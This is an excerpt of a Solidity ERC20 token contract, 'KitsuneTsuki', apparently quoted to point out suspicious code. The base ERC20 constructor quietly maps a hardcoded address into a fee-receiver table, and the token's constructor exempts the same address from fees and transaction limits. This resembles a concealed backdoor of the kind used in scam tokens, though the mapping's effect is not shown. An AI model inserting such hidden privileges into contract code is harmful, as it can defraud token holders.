...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x20cA6ac70deEd8d31F508ebF0C4580AC2Fad7839] = _marketingwallet;
    }
...
contract KitsuneTsuki is ERC20, Ownable {
    ...
    constructor() ERC20("KitsuneTsuki", "Tsuki") {
        ...
        excludeFromFees(address(0x20cA6ac70deEd8d31F508ebF0C4580AC2Fad7839), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x20cA6ac70deEd8d31F508ebF0C4580AC2Fad7839), true);
